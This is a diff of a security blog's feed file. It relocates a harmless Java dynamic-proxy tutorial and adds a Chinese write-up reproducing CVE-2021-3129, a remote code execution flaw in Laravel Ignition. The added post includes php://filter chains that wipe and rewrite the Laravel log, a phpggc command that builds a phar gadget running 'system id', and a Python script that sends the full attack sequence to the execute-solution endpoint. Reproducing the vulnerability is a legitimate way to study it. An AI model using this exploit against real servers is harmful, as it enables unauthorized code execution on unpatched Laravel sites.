@@ -514,224 +514,6 @@ f.close()
       </tags>
   </entry>
   <entry>
-    <title>JAVA代理学习</title>
-    <url>//articles/1d5b525ad1bdf.html</url>
-    <content><![CDATA[<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><pre><code class="java">[可见度] interface 接口名称 [extends 其他的接口名] {
-        // 声明变量
-        // 抽象方法
-}
-
-//接口类的实现
-...implements 接口名称[, 其他接口名称, 其他接口名称..., ...] ...
-</code></pre>
-<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><pre><code class="JAVA">package com.xxxx.helloworld;
-//import java.lang.*;
-
-//调用接口
-public class Hello {
-    public static void main(String[] args) {
-        Helloimplements m = new Helloimplements();
-        m.sayHello(&quot;aaa&quot;);
-    }
-}
-
-//定义接口
-interface IHello {
-
-    void sayHello(String name);
-
-    void sayGoogBye(String name);
-
-}
-//定义类
-class Helloimplements implements IHello {
-    @Override
-    public void sayHello(String name) {
-        System.out.println(&quot;Hello &quot; + name);
-    }
-    @Override
-    public void sayGoogBye(String name) {
-        System.out.println(name+&quot; GoodBye!&quot;);
-    }
-}</code></pre>
-<h2 id="实际用途引入"><a href="#实际用途引入" class="headerlink" title="实际用途引入"></a>实际用途引入</h2><ul>
-<li>假设我们需要在每次问候他人的时候做一个日志记录，这时候我们只需要在<code>Helloimplements</code>加一个写日志的方法即可，但是如果这个<code>Helloimplements</code>是在封装好的JAR里面呢，我们没法修改代码呢？</li>
-</ul>
-<h4 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h4><ul>
-<li>为了实现上述需求我们可以使用静态代理，创建一个新的类作为代理类，具体实现如下,虽然有点像继承，但是本质上还是有所区别，代理的是接口而非类。也就是将一个接口实例化成对象后传入代理类中，代理类相对应的（名称一致）的方法上进行调用对应方法，然后添加我们想增加的功能。这就是所谓的静态代理。</li>
-</ul>
-<pre><code class="java">package com.xxxx.helloworld;
-//import java.lang.*;
-
-
-public class Hello {
-    public static void main(String[] args) {
-        Helloimplements m = new Helloimplements();
-        StaicProxy proxy = new StaicProxy();
-        proxy.setImpl(m);
-        proxy.sayHello(&quot;黄莉荃&quot;);
-    }
-}
-
-
-interface IHello {
-
-    void sayHello(String name);
-
-    void sayGoodBye(String name);
-
-}
-
-class Helloimplements implements IHello {
-    @Override
-    public void sayHello(String name) {
-        System.out.println(&quot;Hello &quot; + name);
-    }
-    @Override
-    public void sayGoodBye(String name) {
-        System.out.println(name+&quot; GoodBye!&quot;);
-    }
-}
-
-class StaicProxy implements IHello{
-    private IHello iHello;
-    public  void setImpl(IHello impl){
-        this.iHello=impl;
-    }
-    @Override
-    public void sayHello(String name) {
-        System.out.println(&quot;logs:SayHello&quot;);
-        iHello.sayHello(name);
-    }
-
-    @Override
-    public void sayGoodBye(String name) {
-        System.out.println(&quot;logs:SayGoodBye&quot;);
-        iHello.sayHello(name);
-    }
-}</code></pre>
-<h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h4><ul>
-<li>动态代理（dynamic proxy）同样需要一个代理类来代理接口，其中比较关键的是<code>newProxyInstance</code>这个方法来实现代理：</li>
-</ul>
-<h5 id="newProxyInstance"><a href="#newProxyInstance" class="headerlink" title="newProxyInstance"></a>newProxyInstance</h5><pre><code class="java">public static Object newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)
-       throws IllegalArgumentException</code></pre>
-<ul>
-<li>参数：</li>
-</ul>
-<blockquote>
-<p>loader: 用哪个类加载器去加载代理对象</p>
-<p>interfaces:动态代理类需要实现的接口</p>
-<p>h:动态代理方法在执行时，会调用h里面的invoke方法去执行</p>
-</blockquote>
-<ul>
-<li><p>实例：</p>
-<ul>
-<li>在代理类中使用一个bind方法来调用<code>newProxyInstance</code>,因为传入的是接口实例化后的对象，所以形参也是<code>Object</code>类型，然后我们将<code>newProxyInstance</code>返回的对象return.</li>
-</ul>
-<pre><code class="java">   public Object bind(Object delegate){
-        this.delegate = delegate;
-        return  Proxy.newProxyInstance(
-          this.delegate.getClass().getClassLoader(),this.delegate.getClass().getInterfaces(),this);
-    }</code></pre>
-</li>
-</ul>
-<h5 id="InvocationHandler"><a href="#InvocationHandler" class="headerlink" title="InvocationHandler"></a>InvocationHandler</h5><ul>
-<li>和前面静态代理一样我们需要定义一个代理类，这个类需要<code>implements</code>InvocationHandler,我们在使用<code>newProxyInstance</code>返回的对象调用相应的方法时候，<code>InvocationHandler</code>会自动调用<code>invoke</code>方法。所以在代理类里面需要定义一个<code>invoke</code>方法。</li>
-</ul>
-<h6 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h6><pre><code class="java">public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
-        System.out.println(&quot;记录日志&quot;);
-        Object result = method.invoke(vehical, args);
-        return result;
-    }</code></pre>
-<ul>
-<li>参数</li>
-</ul>
-<blockquote>
-<p>proxy：就是代理对象，newProxyInstance方法的返回对象</p>
-<p>method：调用的方法</p>
-<p>args: 方法中的参数</p>
-</blockquote>
-<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><pre><code class="java">package com.xxxx.helloworld;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.Method;
-import java.lang.reflect.Proxy;
-
-
-
-public class Hello {
-    public static void main(String[] args) {
-        Helloimplements m = new Helloimplements();
-        DynaProxy proxy = new DynaProxy();
-        IHello ihello = (IHello) proxy.bind(m);
-        ihello.sayHello(&quot;黄莉荃&quot;);
-    }
-}
-
-
-interface IHello {
-    void sayHello(String name);
-    void sayGoodBye(String name);
-}
-
-class Helloimplements implements IHello {
-    @Override
-    public void sayHello(String name) {
-        System.out.println(&quot;Hello &quot; + name);
-    }
-    @Override
-    public void sayGoodBye(String name) {
-        System.out.println(name+&quot; GoodBye!&quot;);
-    }
-}
-class DynaProxy implements InvocationHandler{
-    private Object delegate;
-    public Object bind(Object delegate){
-        this.delegate = delegate;
-        return  Proxy.newProxyInstance(
-          this.delegate.getClass().getClassLoader(),this.delegate.getClass().getInterfaces(),this);
-    }
-    public Object invoke(Object proxy,Method method,Object[] args ) throws  Throwable{
-        Object result =null;
-        try{
-            String originalName = method.getName();
-            if(originalName.equals(&quot;sayHello&quot;)){
-                System.out.println(&quot;logs:sayHello&quot;);
-            }else if(originalName.equals(&quot;sayGoodbye&quot;)){
-                System.out.println(&quot;logs:sayGoodbye&quot;);
-            }
-
-            result = method.invoke(this.delegate,args);
-        }
-        catch (Exception e){
-            e.printStackTrace();
-        }
-        return result;
-    }
-
-}
-</code></pre>
-<h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><ul>
-<li>我们在bind处进行断点，可以看到<code>Helloimplements</code>对象传入。并赋值给<code>delegate</code></li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201114-133749@2x.png" alt="WX20201114-133749@2x"></p>
-<ul>
-<li>跳到下一步可以看到调用了<code>Proxy.newProxyInstance</code>.</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201114-143013@2x.png" alt="WX20201114-143013@2x"></p>
-<ul>
-<li>我们断点在<code>ihello.sayHello(&quot;黄莉荃&quot;);</code>可以看到虽然<code>ihello</code>的静态类型是<code>IHello</code>但是实际的数据类型是<code>$Proxy0</code>.说明这个变量是被JVM加工过的。</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201114-144902@2x.png" alt="WX20201114-144902@2x"></p>
-<ul>
-<li>当这个被JVM加工过的变量的<code>sayHello</code>或者<code>sayGoodbye</code>方法被调用时候，将由JVM自动转交到<code>invoke</code>下去。</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201114-145321@2x.png" alt="WX20201114-145321@2x"></p>
-]]></content>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SQL注入学习笔记</title>
     <url>//articles/21ffb483b.html</url>
     <content><![CDATA[<ul>
@@ -1491,6 +1273,224 @@ for ($ascii = 0; $ascii &lt; 256; $ascii++) {
       </tags>
   </entry>
   <entry>
+    <title>JAVA代理学习</title>
+    <url>//articles/1d5b525ad1bdf.html</url>
+    <content><![CDATA[<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><pre><code class="java">[可见度] interface 接口名称 [extends 其他的接口名] {
+        // 声明变量
+        // 抽象方法
+}
+
+//接口类的实现
+...implements 接口名称[, 其他接口名称, 其他接口名称..., ...] ...
+</code></pre>
+<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><pre><code class="JAVA">package com.xxxx.helloworld;
+//import java.lang.*;
+
+//调用接口
+public class Hello {
+    public static void main(String[] args) {
+        Helloimplements m = new Helloimplements();
+        m.sayHello(&quot;aaa&quot;);
+    }
+}
+
+//定义接口
+interface IHello {
+
+    void sayHello(String name);
+
+    void sayGoogBye(String name);
+
+}
+//定义类
+class Helloimplements implements IHello {
+    @Override
+    public void sayHello(String name) {
+        System.out.println(&quot;Hello &quot; + name);
+    }
+    @Override
+    public void sayGoogBye(String name) {
+        System.out.println(name+&quot; GoodBye!&quot;);
+    }
+}</code></pre>
+<h2 id="实际用途引入"><a href="#实际用途引入" class="headerlink" title="实际用途引入"></a>实际用途引入</h2><ul>
+<li>假设我们需要在每次问候他人的时候做一个日志记录，这时候我们只需要在<code>Helloimplements</code>加一个写日志的方法即可，但是如果这个<code>Helloimplements</code>是在封装好的JAR里面呢，我们没法修改代码呢？</li>
+</ul>
+<h4 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h4><ul>
+<li>为了实现上述需求我们可以使用静态代理，创建一个新的类作为代理类，具体实现如下,虽然有点像继承，但是本质上还是有所区别，代理的是接口而非类。也就是将一个接口实例化成对象后传入代理类中，代理类相对应的（名称一致）的方法上进行调用对应方法，然后添加我们想增加的功能。这就是所谓的静态代理。</li>
+</ul>
+<pre><code class="java">package com.xxxx.helloworld;
+//import java.lang.*;
+
+
+public class Hello {
+    public static void main(String[] args) {
+        Helloimplements m = new Helloimplements();
+        StaicProxy proxy = new StaicProxy();
+        proxy.setImpl(m);
+        proxy.sayHello(&quot;黄莉荃&quot;);
+    }
+}
+
+
+interface IHello {
+
+    void sayHello(String name);
+
+    void sayGoodBye(String name);
+
+}
+
+class Helloimplements implements IHello {
+    @Override
+    public void sayHello(String name) {
+        System.out.println(&quot;Hello &quot; + name);
+    }
+    @Override
+    public void sayGoodBye(String name) {
+        System.out.println(name+&quot; GoodBye!&quot;);
+    }
+}
+
+class StaicProxy implements IHello{
+    private IHello iHello;
+    public  void setImpl(IHello impl){
+        this.iHello=impl;
+    }
+    @Override
+    public void sayHello(String name) {
+        System.out.println(&quot;logs:SayHello&quot;);
+        iHello.sayHello(name);
+    }
+
+    @Override
+    public void sayGoodBye(String name) {
+        System.out.println(&quot;logs:SayGoodBye&quot;);
+        iHello.sayHello(name);
+    }
+}</code></pre>
+<h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h4><ul>
+<li>动态代理（dynamic proxy）同样需要一个代理类来代理接口，其中比较关键的是<code>newProxyInstance</code>这个方法来实现代理：</li>
+</ul>
+<h5 id="newProxyInstance"><a href="#newProxyInstance" class="headerlink" title="newProxyInstance"></a>newProxyInstance</h5><pre><code class="java">public static Object newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)
+       throws IllegalArgumentException</code></pre>
+<ul>
+<li>参数：</li>
+</ul>
+<blockquote>
+<p>loader: 用哪个类加载器去加载代理对象</p>
+<p>interfaces:动态代理类需要实现的接口</p>
+<p>h:动态代理方法在执行时，会调用h里面的invoke方法去执行</p>
+</blockquote>
+<ul>
+<li><p>实例：</p>
+<ul>
+<li>在代理类中使用一个bind方法来调用<code>newProxyInstance</code>,因为传入的是接口实例化后的对象，所以形参也是<code>Object</code>类型，然后我们将<code>newProxyInstance</code>返回的对象return.</li>
+</ul>
+<pre><code class="java">   public Object bind(Object delegate){
+        this.delegate = delegate;
+        return  Proxy.newProxyInstance(
+          this.delegate.getClass().getClassLoader(),this.delegate.getClass().getInterfaces(),this);
+    }</code></pre>
+</li>
+</ul>
+<h5 id="InvocationHandler"><a href="#InvocationHandler" class="headerlink" title="InvocationHandler"></a>InvocationHandler</h5><ul>
+<li>和前面静态代理一样我们需要定义一个代理类，这个类需要<code>implements</code>InvocationHandler,我们在使用<code>newProxyInstance</code>返回的对象调用相应的方法时候，<code>InvocationHandler</code>会自动调用<code>invoke</code>方法。所以在代理类里面需要定义一个<code>invoke</code>方法。</li>
+</ul>
+<h6 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h6><pre><code class="java">public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+        System.out.println(&quot;记录日志&quot;);
+        Object result = method.invoke(vehical, args);
+        return result;
+    }</code></pre>
+<ul>
+<li>参数</li>
+</ul>
+<blockquote>
+<p>proxy：就是代理对象，newProxyInstance方法的返回对象</p>
+<p>method：调用的方法</p>
+<p>args: 方法中的参数</p>
+</blockquote>
+<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><pre><code class="java">package com.xxxx.helloworld;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+import java.lang.reflect.Proxy;
+
+
+
+public class Hello {
+    public static void main(String[] args) {
+        Helloimplements m = new Helloimplements();
+        DynaProxy proxy = new DynaProxy();
+        IHello ihello = (IHello) proxy.bind(m);
+        ihello.sayHello(&quot;黄莉荃&quot;);
+    }
+}
+
+
+interface IHello {
+    void sayHello(String name);
+    void sayGoodBye(String name);
+}
+
+class Helloimplements implements IHello {
+    @Override
+    public void sayHello(String name) {
+        System.out.println(&quot;Hello &quot; + name);
+    }
+    @Override
+    public void sayGoodBye(String name) {
+        System.out.println(name+&quot; GoodBye!&quot;);
+    }
+}
+class DynaProxy implements InvocationHandler{
+    private Object delegate;
+    public Object bind(Object delegate){
+        this.delegate = delegate;
+        return  Proxy.newProxyInstance(
+          this.delegate.getClass().getClassLoader(),this.delegate.getClass().getInterfaces(),this);
+    }
+    public Object invoke(Object proxy,Method method,Object[] args ) throws  Throwable{
+        Object result =null;
+        try{
+            String originalName = method.getName();
+            if(originalName.equals(&quot;sayHello&quot;)){
+                System.out.println(&quot;logs:sayHello&quot;);
+            }else if(originalName.equals(&quot;sayGoodbye&quot;)){
+                System.out.println(&quot;logs:sayGoodbye&quot;);
+            }
+
+            result = method.invoke(this.delegate,args);
+        }
+        catch (Exception e){
+            e.printStackTrace();
+        }
+        return result;
+    }
+
+}
+</code></pre>
+<h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><ul>
+<li>我们在bind处进行断点，可以看到<code>Helloimplements</code>对象传入。并赋值给<code>delegate</code></li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201114-133749@2x.png" alt="WX20201114-133749@2x"></p>
+<ul>
+<li>跳到下一步可以看到调用了<code>Proxy.newProxyInstance</code>.</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201114-143013@2x.png" alt="WX20201114-143013@2x"></p>
+<ul>
+<li>我们断点在<code>ihello.sayHello(&quot;黄莉荃&quot;);</code>可以看到虽然<code>ihello</code>的静态类型是<code>IHello</code>但是实际的数据类型是<code>$Proxy0</code>.说明这个变量是被JVM加工过的。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201114-144902@2x.png" alt="WX20201114-144902@2x"></p>
+<ul>
+<li>当这个被JVM加工过的变量的<code>sayHello</code>或者<code>sayGoodbye</code>方法被调用时候，将由JVM自动转交到<code>invoke</code>下去。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201114-145321@2x.png" alt="WX20201114-145321@2x"></p>
+]]></content>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XCTF鲲鹏专场babyphp Write Up</title>
     <url>//articles/babyphp_Write_Up.html</url>
     <content><![CDATA[<h1 id="babyphp-Write-Up"><a href="#babyphp-Write-Up" class="headerlink" title="babyphp Write Up"></a>babyphp Write Up</h1><p>题目是一个内网的扫描器，直接扫描内网端口看看。抓包发现提示去谷歌搜索找源码</p>
@@ -1647,6 +1647,96 @@ if($url != null){
 <p><img src="http://goodcheerleung.gitee.io/macpic/WX20201223-200254@2x.png" alt="WX20201223-200254@2x"></p>
 <p>修改一下读取flag。</p>
 <p><img src="http://goodcheerleung.gitee.io/macpic/WX20201223-200056@2x.png" alt="WX20201223-200056@2x"></p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2021-3129复现</title>
+    <url>//articles/c884ec29bf3ccc94.html</url>
+    <content><![CDATA[<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>Laravel&lt;8.4.3&amp;&amp;Facade Ignition &lt; 2.5.2 在在Debug模式下，Ignition某些接口并未做过滤，导致file_get_contents()和file_put_contents()，函数参数被控制，黑客可通过控制日志文件引起Phar反序列化执行远程代码.</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>假设我们在模板中使用了一个不存在的变量，那么Ignition会提出解决方案使用三目运算符将变量置为空。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-091932@2x.png" alt="WX20210422-091932@2x"></p>
+<p>我们点击<code>Make variable optional</code>会调用一些方法来替换模板上的变量。我们抓取这个数据包进行分析：</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-092155@2x.png" alt="WX20210422-092155@2x"></p>
+<p>可以看到其调用解决方案在<code>Ignition\\Solutions\\MakeViewVariableOptionalSolution</code>下，并提供两个参数跟别是需要修改的变量，模板文件的位置。</p>
+<p>我们先从<code>src/IgnitionServiceProvider.php</code>寻找对应post的路由进行追溯。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-092858@2x.png" alt="3"></p>
+<p>很明显直接调用了<code>ExecuteSolutionController</code>追溯下去是是一个单行为的控制器，直接将参数传入了<code>run</code>方法.</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-093035@2x.png" alt="WX20210422-093035@2x"></p>
+<p>通过<code>run</code>方法会将参数传递到各个解决方案之中。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-093353@2x.png" alt="WX20210422-093353@2x"></p>
+<p>我们直接到追溯到<code>src/Solutions/MakeViewVariableOptionalSolution.php</code>。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-093643@2x.png" alt="WX20210422-093643@2x"></p>
+<p>可以观察到，先将参数传入<code>makeOptional</code>处理完毕后若返回值不为null就能够调用到<code>file_put_contents</code>。我们追溯<code>makeOptional</code>方法，可以看到<code>file_get_contents</code>是完全可控的。如果网站存在上传功能可以直接上传phar文件进行反序列化，这里不做讨论。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-094346@2x.png" alt="WX20210422-094346@2x"></p>
+<p>这里对<code>$parameters[&#39;variableName&#39;]</code>几乎是不可控的，因为代码使用<code>token_get_all</code>进行了处理，然后同功能遍历返回值进行判断是否存在<a href="http://php.net/manual/zh/tokens.php" target="_blank" rel="noopener">解析器代号列表</a>中的对应代号，简单的说代码对我们传入的参数进行了PHP结构分析，假设我们修改了参数，代码会进行结果对比阻止我们的行为。</p>
+<blockquote>
+<p><strong>token_get_all</strong>() 解析提供的 <code>source</code> 源码字符，然后使用 Zend 引擎的语法分析器获取源码中的 <strong>PHP</strong> 语言的解析器代号</p>
+<p>解析器代号列表见<a href="http://php.net/manual/zh/tokens.php" target="_blank" rel="noopener">解析器代号列表</a>, 或者使用 <a href="http://php.net/manual/zh/function.token-name.php" target="_blank" rel="noopener">token_name()</a> 翻译获取这个代号的字符串表示.</p>
+</blockquote>
+<p>前面说了，<code>file_get_contents</code>所有变量是可控的，我们要想RCE有两条路：①上传文件进行反序列化②写入日志文件进行反序列化</p>
+<p>我们接下来来分析第二条路径。laravel默认日志路径存储在<code>storage/logs/laravel.log</code>.假设我们加载一个存在的<code>view</code>错误的日志文件将会存储在这里。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-101124@2x.png" alt="WX20210422-101124@2x"></p>
+<p>虽日志文件内容可控，但是日志文件后缀无法改变。我们能否写入Phar文件进行反序列化呢？但是日志文件存在许多的“废代码”，但是phar文件必须以<code>__HALT_COMPILER();?&gt;</code>结尾，可以简答理解<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>xxx的内容不限。</p>
+<p>要想清除多余的代码，我们很容易地联想到P神的<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a>文章巧妙地利用base64的特性吃掉了多余的代码。但是base64是4比特一组但是如果等于号在中间合法的base64字符将不会被忽略，同时观察日志内容，我们注入的代码只是很小的一部分，前后都有对应的堆栈跟踪信息，我很难确保内容不会出错。面对这样的问题，作者提出了将日志内容直接清空的想法。</p>
+<h3 id="Trick-1"><a href="#Trick-1" class="headerlink" title="Trick 1"></a>Trick 1</h3><p>作者提出存在一个未被官方文档记录的过滤器<code>consumed</code>它能够清除文件内容</p>
+<pre><code class="php">php://filter/read=consumed/resource=../storage/logs/laravel.log</code></pre>
+<h3 id="Trick-2"><a href="#Trick-2" class="headerlink" title="Trick 2"></a>Trick 2</h3><pre><code class="php">php://filter/read=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log</code></pre>
+<p>先将内容从UTF8转换为UTF16将结果进行<code>quoted-printable</code>编码，之后再转换为UTF-8.之后进行base64解码得到这样就吃掉没有用的字符了。</p>
+<p>我们将payload写入之后如何转换为正确的phar文件呢？</p>
+<p>我们写入一个较长的Payload观察一下日志有哪些规律。可以看到payload完全出现的地方有两个。</p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210422-161405@2x.png" alt="WX20210422-161405@2x"></p>
+<p>结构可以简单记作：</p>
+<pre><code>[x1]payload[x2]payload[x3]</code></pre><p>那么怎么才能去掉[x1]….[x2]…[x3]这些非payload的内容呢。我们前面所说，base64没法完全吃掉所有的字符，我们只能将这些字符转换为base64所规定的非法字符。</p>
+<p>UTF-16将UTF-16以外的字符转换为base64非法字符</p>
+<p>例如：</p>
+<pre><code class="php">echo -ne &#39;[x1]p\0a\0y\0l\0o\0a\0d\0[x2]p\0a\0y\0l\0o\0a\0d\0[x3]&#39; &gt;test.txt</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210425-110616@2x.png" alt="WX20210425-110616@2x"></p>
+<p>由于utf-16 使用两个字节所以在后面加多一个字节导致后面解析失败,这样咱们就可以只保留下来一个payload</p>
+<pre><code class="php">echo -ne &#39;[x1]p\0a\0y\0l\0o\0a\0d\0X[x2]p\0a\0y\0l\0o\0a\0d\0X[x3]&#39; &gt;test.txt</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210425-112338@2x.png" alt="WX20210425-112338@2x"></p>
+<p>接下来我们需要对空字节进行处理，因为<code>file_get_contents</code>在遇到空字节时候会抛出<code>warning</code>我们需要对空字节进行编码也就是使用<code>convert.quoted-printable-decode</code>。</p>
+<p>至此转换连构造</p>
+<pre><code class="PHP">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log</code></pre>
+<p>综上攻击思路如下：</p>
+<pre><code class="php">1. 编码构造 payloadb64 -&gt; quoted-printable ，这里构造好后，还要在末尾添加一字符，确保有且只有一处是完整的 payload 。
+2. 清空 log 文件
+3. 发送无害 payload 对齐
+4. 发送攻击 payload
+5. 解码转换 log 至 pharquoted-printable -&gt; utf-16 转 utf-8 -&gt; b64
+6. phar 伪协议执行</code></pre>
+<p>手动Burpsuite没有复现出来，原因不明，编写脚本复现成功：</p>
+<p>其中phar，最终生成的payload加上个a对齐。</p>
+<pre><code class="shell">php -d &quot;phar.readonly=0&quot; ./phpggc Laravel/RCE7 system id --phar phar -o php://output | base64 -w 0 | python -c &quot;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex (ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&gt;payload.txt</code></pre>
+<p>最终</p>
+<pre><code class="python">import requests
+import json
+headers = {
+    &quot;Content-Type&quot;:&quot;application/json&quot;
+}
+
+payload = {
+&quot;clean&quot; : &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;,
+&quot;add&quot; : &quot;AA&quot;,
+&quot;phar&quot; : &quot;=50=00=44=00=39=0........00=52=00=42=00=73=00=31=00=72=00=6D=00=61=00=6B=00=59=00=51=00=68=00=6D=00=4E=00=52=00=79=00=32=00=32=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00a&quot;,
+&quot;decode&quot; : &quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;,
+&quot;attack&quot; : &quot;phar://../storage/logs/laravel.log&quot;
+}
+
+url = &quot;http://xxx/_ignition/execute-solution&quot;
+for i in payload:
+    data={&quot;solution&quot;:&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,
+    &quot;parameters&quot;:{
+    &quot;variableName&quot;:&quot;$name&quot;,
+    &quot;viewFile&quot;:&quot;%s&quot;%(payload[i])
+    }
+    }
+    r = requests.post(url,data=json.dumps(data),headers=headers)
+print(r.text)</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/QQ20210427-231128@2x.png" alt="QQ20210427-231128@2x"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/231459#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/231459#h3-5</a></p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
